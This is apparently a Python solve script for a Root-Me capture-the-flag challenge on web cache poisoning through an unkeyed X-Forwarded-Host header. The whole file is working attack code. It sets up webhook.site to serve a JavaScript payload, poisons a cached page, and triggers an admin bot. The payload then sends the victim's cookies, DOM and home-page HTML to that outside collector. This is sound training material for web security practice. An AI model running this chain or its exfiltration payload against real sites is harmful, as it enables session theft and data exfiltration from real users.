#!/usr/bin/env python3
"""
Root-Me Pro - Web Cache Poisoning - Unkeyed HTTP Header

Usage:
    python3 solve.py https://instance-<NEW-UUID>.challenges.root-me.pro

Chain:
  1. Configure webhook.site to serve the payload as application/javascript
     (webhook.site answers EVERY path, so it also serves /static/js/confettis_manager.js).
  2. Poison the cache entry for /?username=<uniq> via the unkeyed X-Forwarded-Host header.
  3. Verify the poisoned copy comes back WITHOUT the header (x-cache: hit).
  4. Report that path to the admin bot (POST /report).
  5. Poll the collector for the exfiltrated admin cookie / DOM.
"""
import json
import random
import re
import sys
import time
import urllib.parse

import requests

# Reuse the existing collector, or set to None to mint a fresh one.
UUID = "1c193db3-164e-4804-8c79-ada6bbd6bab5"
SCRIPT_PATH = "/static/js/confettis_manager.js"

# Synchronous XHR on purpose: the headless bot tears the page down straight
# after load, which silently cancelled an async `new Image()` beacon.
# Exfils the admin cookie, the current DOM, and the admin's view of "/" --
# the nav tab is labelled "Congrats", so the flag likely renders there for
# the admin rather than living in a (probably HttpOnly) cookie.
PAYLOAD = """
var u="{uuid}";
function send(p,d){{
  try{{var x=new XMLHttpRequest();x.open("GET","https://webhook.site/"+u+"/"+p+"?"+d,false);x.send();return 1;}}
  catch(e){{try{{new Image().src="https://webhook.site/"+u+"/"+p+"img?"+d;}}catch(e2){{}} return 0;}}
}}
/* Fires first: proves the script executed at all. If we see /hello but no /x,
   the exfil call is what fails; if we see neither, the JS never ran. */
send("hello","t="+Date.now());
try{{
  send("x","c="+encodeURIComponent(document.cookie)+"&u="+encodeURIComponent(location.href));
}}catch(e){{send("err","e="+encodeURIComponent(e.message));}}
try{{
  var h=new XMLHttpRequest();h.open("GET","/",false);h.send();
  send("home","d="+encodeURIComponent(h.responseText.slice(0,2000)));
}}catch(e){{send("err2","e="+encodeURIComponent(e.message));}}
try{{
  send("dom","d="+encodeURIComponent(document.documentElement.innerHTML.slice(0,2000)));
}}catch(e){{}}
"""


def mint_token():
    return requests.post("https://webhook.site/token", json={}, timeout=20).json()["uuid"]


def configure(uuid):
    js = PAYLOAD.format(uuid=uuid)
    requests.put(
        f"https://webhook.site/token/{uuid}",
        json={
            "default_content": js,
            "default_content_type": "application/javascript",
            "default_status": 200,
        },
        timeout=20,
    ).raise_for_status()
    ct = requests.get(f"https://webhook.site/{uuid}{SCRIPT_PATH}", timeout=20).headers.get(
        "content-type", ""
    )
    # MIME must be JS: the challenge/collector send nosniff, text/html won't execute.
    assert "javascript" in ct, f"bad content-type: {ct}"
    print(f"[+] collector serving payload as {ct}")


def poison(target, victim_path, uuid):
    marker = f"//webhook.site/{uuid}{SCRIPT_PATH}"
    r = requests.get(
        target + victim_path,
        headers={"X-Forwarded-Host": f"webhook.site/{uuid}"},
        timeout=20,
    )
    print(f"[+] poison  x-cache={r.headers.get('x-cache')}")
    assert marker in r.text, "reflection failed - header name may differ"

    v = requests.get(target + victim_path, timeout=20)  # victim: no header at all
    print(f"[+] verify  x-cache={v.headers.get('x-cache')}")
    if marker not in v.text:
        sys.exit("[-] cache NOT poisoned (entry evicted?) - just re-run")
    print("[+] cache poisoned - unkeyed header confirmed")


def report(target, victim_path):
    r = requests.post(target + "/report", data={"path": victim_path}, timeout=25)
    if "has been sent" not in r.text:
        sys.exit("[-] report rejected")
    print(f"[+] reported {victim_path} to admin bot")


def poll(uuid, tries=25, delay=6):
    seen = set()
    for i in range(1, tries + 1):
        time.sleep(delay)
        data = requests.get(
            f"https://webhook.site/token/{uuid}/requests",
            params={"sorting": "newest", "per_page": 50},
            timeout=20,
        ).json()
        for req in data.get("data", []):
            if req["uuid"] in seen:
                continue
            seen.add(req["uuid"])
            ua = (req.get("headers", {}).get("user-agent") or [""])[0]
            if SCRIPT_PATH in req.get("url", ""):
                # Not a callback, but proves the bot loaded the poisoned page.
                print(f"    [bot] script fetched by: {ua[:60]}")
                continue
            q = req.get("query") or {}
            print(f"\n[!] CALLBACK {req.get('method')} {req.get('url')}")
            for k, v in q.items():
                print(f"  --- {k} ---\n  {str(v)[:3000]}")
            if q:
                return q
        print(f"    poll {i}/{tries} - no exfil yet")
    return None


if __name__ == "__main__":
    if len(sys.argv) < 2:
        sys.exit(__doc__)
    target = sys.argv[1].rstrip("/")

    uuid = UUID or mint_token()
    print(f"[*] collector: https://webhook.site/#!/{uuid}")
    configure(uuid)

    victim_path = f"/?username=pwn{random.randint(10000, 99999)}"
    print(f"[*] victim path: {victim_path}")
    poison(target, victim_path, uuid)
    report(target, victim_path)

    got = poll(uuid)
    if got:
        blob = urllib.parse.unquote(json.dumps(got))
        for flag in set(re.findall(r"RM\{[^}]+\}", blob)):
            print(f"\n[+++] FLAG: {flag}")
    else:
        print("[-] no callback - re-poison (cache may have been evicted) and re-report")
